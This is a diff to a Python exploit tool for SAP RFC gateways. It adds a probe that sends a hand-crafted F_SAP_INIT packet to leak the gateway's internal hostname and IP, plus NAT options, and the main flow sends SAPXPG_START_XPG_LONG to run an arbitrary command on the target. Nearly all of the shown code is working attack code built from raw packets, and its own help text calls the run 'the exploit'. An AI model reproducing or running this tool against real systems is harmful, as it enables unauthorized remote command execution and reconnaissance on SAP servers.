+    flat = bytes(b if 32 <= b < 127 else 0 for b in data)
+    for m in re.finditer(rb'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', flat):
+        try:
+            ip_str = m.group(0).decode('ascii')
+            socket.inet_aton(ip_str)
+            octs = [int(x) for x in ip_str.split('.')]
+            if octs[0] in (0, 127, 224, 225, 255): continue  # skip bogon/multicast
+            if octs[0] == 169 and octs[1] == 254: continue   # skip APIPA
+            return ip_str
+        except (OSError, ValueError):
+            continue
     return None
 
 
@@ -1246,6 +2418,205 @@ def hexdump(data, prefix=''):
         print(f'{prefix}{i:04x}: {hex_part:<48s}  {ascii_part}')
 
 
+def probe_server_ip(target_ip, target_port, client_ip, instance, sid, appserver,
+                    protocol, verbose=False, debug=False):
+    """Discover the SAP server's internal IP.
+
+    Uses the SAPMAP Chipik-style F_SAP_INIT probe (Method 3) which triggers a
+    gateway error response containing "SAP-Gateway on host HOSTNAME / sapgwNN".
+    The hostname is then resolved via DNS to obtain the internal IP address.
+
+    This approach works reliably against any SAP gateway regardless of whether
+    the caller is a trusted RFC peer, because it exploits an error path, not
+    the actual RFC function call.
+
+    Returns the server's IPv4 as a dotted-decimal string, or None on failure.
+    """
+    import random as _random, os as _os
+    import time as _t
+
+    # Build the RFC_SYSTEM_INFO probe using the original S/4HANA template
+    # (byte13=0x01, P3_RFCSI_TEMPLATE from rfc_system_info.pcapng).  A random
+    # conv_id and synthetic PTE are generated; the gateway echoes the conv_id
+    # back but does not validate the PTE for unauthenticated probes.
+    conv_id = str(_random.randint(10000000, 99999999))
+    pte     = _os.urandom(8) + b'\xe1\x00\x00\x00' + socket.inet_aton(client_ip)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(15)
+    try:
+        sock.connect((target_ip, target_port))
+        if verbose:
+            print(f'[+] Connected to {target_ip}:{target_port}')
+
+        # Step 1: CHECK_GATEWAY (type 0x04 "sapdp") — from rfc_system_info_npl.pcapng
+        p_check = build_gw_check(client_ip, instance)
+        if debug:
+            print(f'[DBG] CHECK_GATEWAY ({len(p_check)} bytes):')
+            hexdump(p_check, '      ')
+        ni_send(sock, p_check)
+        check_resp = ni_recv(sock)
+        if debug:
+            print(f'[DBG] CHECK_GATEWAY response ({len(check_resp)} bytes):')
+            hexdump(check_resp, '      ')
+
+        # Step 2: RFC_SYSTEM_INFO (updated S/4HANA format, version 1-15-2-21010)
+        # from rfc_system_info_s4h.pcapng — accepted by modern kernels (793+).
+        request = build_rfcsi_s4h_probe(conv_id, pte, sid=sid, appserver=appserver,
+                                         client_ip=client_ip, target_ip=target_ip)
+        if debug:
+            print(f'[DBG] RFC_SYSTEM_INFO probe ({len(request)} bytes NI body):')
+            hexdump(request, '      ')
+        ni_send(sock, request)   # adds the 4-byte NI length prefix
+
+        # Receive: server returns RFCSI data in a single 06 cb frame.
+        # Keep reading until the "011" RFCPROTO UTF-16LE marker or
+        # an ASCII 43 XX 80 IP is found, or the timeout expires.
+        _proto_marker = '011'.encode('utf-16-le')
+        response = b''
+        t0 = _t.time()
+        try:
+            while _t.time() - t0 < 15:
+                sock.settimeout(max(0.5, 15 - (_t.time() - t0)))
+                chunk = sock.recv(8192)
+                if not chunk:
+                    break
+                response += chunk
+                # Stop as soon as we have the RFCSI data
+                if _proto_marker in response:
+                    break
+                # Or the ASCII RFCSI format
+                if parse_rfcsi_ipaddr(response):
+                    break
+        except socket.timeout:
+            pass
+
+        if debug:
+            rfcsi_resp = response[4:] if len(response) > 4 else response
+            print(f'[DBG] RFC_SYSTEM_INFO response ({len(response)} bytes):')
+            hexdump(rfcsi_resp[:80], '      ')
+
+        # Try SAPMAP-style parser first: search for UTF-16LE "011" RFCPROTO marker
+        rfcsi_info = parse_rfcsi_direct_response(response)
+        if rfcsi_info.get('RFCIPADDR'):
+            ip = rfcsi_info['RFCIPADDR'].strip()
+            if verbose:
+                print(f'[+] RFCIPADDR: {ip}')
+                for k in ('RFCHOST2', 'RFCSYSID', 'RFCKERNRL', 'RFCOPSYS'):
+                    if k in rfcsi_info:
+                        print(f'[+]   {k}: {rfcsi_info[k]}')
+            try:
+                socket.inet_aton(ip)
+                return ip
+            except OSError:
+                pass
+
+        # ASCII 43 XX 80 format / TLV 0x0007 format
+        if len(response) > 4:
+            rfcsi_resp = response[4:]
+            ip = parse_06cb_server_ip(rfcsi_resp, _verbose=verbose, _debug=debug)
+            if ip:
+                return ip
+
+        if verbose:
+            print('[!] Server IP not found in direct RFC response', file=sys.stderr)
+
+    except Exception as e:
+        if verbose:
+            print(f'[!] Probe exception: {e}', file=sys.stderr)
+            if debug:
+                import traceback
+                traceback.print_exc()
+        return None
+    finally:
+        sock.close()
+
+    # ── Chipik-style F_SAP_INIT error leak ──────────────────────────────────
+    # SAPMAP Method 3: sends an F_SAP_INIT with ctype=E (external program) and
+    # T_75 destination.  The gateway rejects this but the error response leaks
+    # the hostname ("SAP-Gateway on host X / sapgwNN").  We then try DNS.
+    if verbose:
+        print('[*] Falling back to Chipik F_SAP_INIT error leak for hostname ...')
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)
+    try:
+        sock.connect((target_ip, target_port))
+
+        # P1: V2 GW_NORMAL_CLIENT
+        p1_v2 = bytearray()
+        service = f'sapgw{int(instance):02d}'.encode()
+        p1_v2 += b'\x02\x03' + socket.inet_aton(client_ip) + b'\x00' * 4
+        p1_v2 += service.ljust(10, b'\x00') + b'4103' + b'\x00' * 6
+        p1_v2 += b'sapserve' + service.ljust(8, b' ') + b' ' * 8
+        p1_v2 += b'\x06\x0b\xff\xff' + b'\x00' * 6
+        ni_send(sock, bytes(p1_v2))
+        ni_recv(sock)
+
+        # P2: Chipik F_SAP_INIT (ctype=E, T_75, sapxpg)
+        p2 = bytearray()
+        p2 += b'\x06\xCA\x03\x00\x00\x13\xFF\xFF\x00\x00\x01\x00'
+        p2 += b'\x00\x00\x00\x00\xC0\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00'
+        p2 += b'\x01\x54\x00\x00\x87\x00' + b'\x00' * 16
+        p2 += b'T_75    ' + target_ip.encode('ascii').ljust(32, b'\x00')
+        p2 += b'sapxpg  \x45\x02\x00\x00\x00\x00\xFF\xFF'
+        p2 += b'\x60\x00\x00\x00\x00\x00\x00\x00\x00\x0E\x02\x00\x00\x00\x00'
+        p2 += b'\xE8\x4D\x23\x00\xDF\x07\x00\x00\x01\x00'
+        p2 += bytes.fromhex('4ED581E309F6F118A00A000C290099D0')
+        p2 += b'\x00' * 4 + b'\xFF\xFF\xFF\xFE\xFF\xFF\xFF\xFE\x02\x00\x00\x00'
+        p2 += b'\x00' * 17 + target_ip.encode('ascii')[:15].ljust(15, b'\x00')
+        p2 += b'\x00' * 113 + b'SAP*' + b' ' * 16
+        p2 += b'\x00' * 4 + b' ' * 12 + b'\x00' * 16
+        p2 += socket.inet_aton(client_ip) + b'\x00' * 4 + b'sapxpg' + b'\x00' * 62
+        ni_send(sock, bytes(p2))
+        err_resp = ni_recv(sock)
+
+        # Parse "SAP-Gateway on host X / sapgwNN" from error
+        import re as _re
+        m = _re.search(rb'SAP-Gateway on host (\S+)\s*/\s*\S+', err_resp)
+        if m:
+            gw_hostname = m.group(1).decode('ascii', errors='replace').strip()
+            if verbose:
+                print(f'[+] Gateway hostname: {gw_hostname!r}')
+
+            # Try connecting to the hostname directly as the server IP.
+            # If you are on the internal network, the hostname resolves to
+            # the internal IP → use it as --server-ip.
+            # If you are external, DNS gives the public IP which you already
+            # know → manual --server-ip is still required.
+            candidates = [gw_hostname, gw_hostname.split('.')[0]]
+            for h in candidates:
+                try:
+                    addrs = [r[4][0] for r in socket.getaddrinfo(h, None)
+                             if ':' not in r[4][0]]
+                    for addr in addrs:
+                        if addr == target_ip:
+                            continue  # skip the IP we're already connecting to
+                        try:
+                            socket.inet_aton(addr)
+                            if verbose:
+                                print(f'[+] Resolved {h!r} → {addr}')
+                            return addr
+                        except OSError:
+                            pass
+                except socket.gaierror:
+                    continue
+            if verbose:
+                print(f'[*] Gateway hostname is {gw_hostname!r}; '
+                      f'resolve it from your network to find the internal IP.',
+                      file=sys.stderr)
+                print(f'[*] Then use: --server-ip <internal-ip>', file=sys.stderr)
+        elif verbose:
+            print('[!] No hostname in error response', file=sys.stderr)
+
+    except Exception as e:
+        if verbose:
+            print(f'[!] Chipik fallback exception: {e}', file=sys.stderr)
+    finally:
+        sock.close()
+
+    return None
+
+
 # ============================================================================
 # Main
 # ============================================================================
@@ -1274,6 +2645,17 @@ def main():
                              'Default: vhcala4hci (modern) or npl-sxpg (legacy).\n'
                              'Must match the app server registered on the target gateway.\n'
                              'Example: --sid NW7 --appserver myhost')
+    parser.add_argument('--server-ip', default=None, metavar='IP',
+                        help='Internal/private IP to embed in packets.\n'
+                             'Use when -t is a public or NAT address but the\n'
+                             'server only recognises its own internal IP.\n'
+                             'Default: same as -t.\n'
+                             'Run --check to auto-detect the server\'s internal IP.')
+    parser.add_argument('--check', action='store_true',
+                        help='Probe the target via a P2 handshake, print the\n'
+                             'server\'s detected internal IP, and exit.\n'
+                             'Useful for discovering the right --server-ip value\n'
+                             'before running the exploit.')
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='Show connection steps and session details')
     parser.add_argument('-d', '--debug', action='store_true',
@@ -1304,10 +2686,35 @@ def main():
     except Exception:
         client_ip = '127.0.0.1'
 
+    # --check: call RFC_SYSTEM_INFO to discover the server's own RFCIPADDR
+    if args.check:
+        print(f'[*] Calling RFC_SYSTEM_INFO on {target_ip}:{target_port} ...')
+        if verbose:
+            print(f'[*] Client: {client_ip}  SID: {sid}  AppServer: {appserver}')
+        detected = probe_server_ip(target_ip, target_port, client_ip, instance,
+                                   sid, appserver, protocol,
+                                   verbose=verbose, debug=debug)
+        if detected:
+            print(f'[+] Server RFCIPADDR: {detected}')
+            if detected != target_ip:
+                print(f'[!] Differs from -t {target_ip!r} (NAT detected)')
+                print(f'[!] Use: --server-ip {detected}')
+            else:
+                print(f'[+] Matches -t ({target_ip}); --server-ip not needed.')
+        else:
+            print('[!] RFC_SYSTEM_INFO call failed or returned no IP.')
+            print('[!] If behind NAT, specify --server-ip <internal-ip> manually.')
+        sys.exit(0)
+
+    # IP embedded in packets: may differ from the TCP connection target (NAT)
+    server_ip = args.server_ip if args.server_ip else target_ip
+
     if verbose:
         print(f'[*] Target: {target_ip}:{target_port} (instance {instance})')
         print(f'[*] Protocol: {protocol}')
         print(f'[*] Client: {client_ip}')
+        if server_ip != target_ip:
+            print(f'[*] Server IP (in packets): {server_ip}')
         print(f'[*] SID: {sid}  AppServer: {appserver}')
         print(f'[*] TH routing: {sid}/{appserver}_{sid}_00')
         print(f'[*] Command: {cmd}')
@@ -1338,9 +2745,9 @@ def main():
         if verbose:
             print('[+] Sending F_SAP_INIT')
         if protocol == 'legacy':
-            p2 = build_sap_init_npl(client_ip, target_ip, sid=sid)
+            p2 = build_sap_init_npl(client_ip, server_ip, sid=sid)
         else:
-            p2 = build_sap_init(P2_TEMPLATE, client_ip, target_ip, sid=sid)
+            p2 = build_sap_init(P2_TEMPLATE, client_ip, server_ip, sid=sid)
         if debug:
             print(f'[DBG] P2 ({len(p2)} bytes):')
             hexdump(p2, '      ')
@@ -1364,7 +2771,7 @@ def main():
             print('[+] Sending SAPXPG_START_XPG_LONG')
         if protocol == 'legacy':
             p3 = build_sap_send_start_npl(conv_id, cmd, pte, sid=sid, appserver=appserver,
-                                          client_ip=client_ip, target_ip=target_ip)
+                                          client_ip=client_ip, target_ip=server_ip)
         else:
             p3 = build_sap_send_start(conv_id, cmd, pte, sid=sid, appserver=appserver)
         if debug:
@@ -1413,14 +2820,8 @@ def main():
         if output is not None:
             print(output)
         else:
-            # Check if this is the compressed format without pysapcompress
-            if b'\x03\x02\x03\x05' in resp and not _HAS_PYSAPCOMPRESS:
-                print('[!] Output is SAP LZH compressed (large output). '
-                      'Install pysapcompress: pip install pysapcompress',
-                      file=sys.stderr)
-            else:
-                print('[!] No output received (command may have failed or produced no output)',
-                      file=sys.stderr)
+            print('[!] No output received (command may have failed or produced no output)',
+                  file=sys.stderr)
             if verbose:
                 print(f'[!] START response ({len(start_resp)} bytes):')
                 hexdump(start_resp, '    ')
